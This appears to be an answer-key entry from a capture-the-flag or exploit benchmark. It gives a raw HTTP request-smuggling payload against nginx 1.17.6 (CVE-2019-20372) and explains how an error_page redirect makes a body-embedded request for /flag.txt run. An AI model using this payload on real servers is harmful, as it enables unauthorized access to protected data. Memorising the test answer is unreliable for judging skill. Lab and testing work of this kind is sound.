expected_payload_pattern:
Raw TCP: 'GET /flag HTTP/1.1
Host: target:3009
Content-Length: 56

GET /flag.txt HTTP/1.1
Host: localhost:3009

'

poc.rationale: Server runs nginx 1.17.6 which has CVE-2019-20372. The error_page 401 directive on location /flag triggers an internal redirect that confuses the keep-alive connection state, causing body bytes of the first request to be parsed as a pipelined second request. A request body crafted as a valid HTTP request for /flag.txt is therefore executed against the backend, returning the flag content.
